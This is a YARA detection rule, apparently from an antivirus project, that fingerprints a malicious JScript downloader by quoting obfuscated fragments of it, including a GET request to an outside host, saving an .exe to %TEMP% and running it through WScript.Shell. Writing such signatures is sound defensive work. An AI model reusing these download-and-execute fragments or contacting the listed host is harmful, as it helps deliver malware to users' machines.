rule sig_20160328_a07c7f53902c786c7e52affde958b6d9 {
  meta:
    description = "datamaliciousorder - file 20160328_a07c7f53902c786c7e52affde958b6d9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a113144d55bad1d8cbd92795ccddc932a0df70132ab777b8ada85ec8cd5e32c9"

  strings:
    $s1  = "function Rnwdoo() {return Pmsespjup[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dsEoZHr4FWA.exe\";};" fullword ascii
    $s2  = "do {WScript[Fjfehtaey](Twaawwp() * 11)} while (Zasui[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Zasui[Bciujknvxu](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Xluljfmn(Csvmvgv, Yxdzs){return Csvmvgv - Yxdzs;};" fullword ascii
    $s5  = "var Pmsespjup = function Hexczk() {return WScript[Totednlax](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Pvsctvskaw() {return ((Adejrycvj == true) && (Adejrycvj == Ldmkqqydm)) ? 1 : Vharntxt;};" fullword ascii
    $s7  = "function Dikhvqrms(Kcqzrdom){Pmsespjup[\"Run\"](Kcqzrdom, Vharntxt, Vharntxt);};" fullword ascii
    $s8  = "Ldmkqqydm = true; " fullword ascii
    $s9  = "function Slygwxfymi(){return Totednlax;};" fullword ascii
    $s10 = "function Xszeuh()" fullword ascii
    $s11 = "function Ofkphr(Jzbrjimz) {var Cvevfouqtz = (1, 2, 3, 4, 5, Jzbrjimz); return Cvevfouqtz;};" fullword ascii
    $s12 = "return Xluljfmn(Zcgrqesql, Hjrrdasqhs);" fullword ascii
    $s13 = "var Ddnfnkba = false;" fullword ascii
    $s14 = "var Ldmkqqydm = false;" fullword ascii
    $s15 = "function Twaawwp(){return 22;};" fullword ascii
    $s16 = "var Adejrycvj = false;" fullword ascii
    $s17 = "function Wcyrg(){return Sdvffyc;};" fullword ascii
    $s18 = "Adejrycvj = true; " fullword ascii
    $s19 = "var Bqgqn = new this[\"Date\"]();" fullword ascii
    $s20 = " while (Yefvt){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}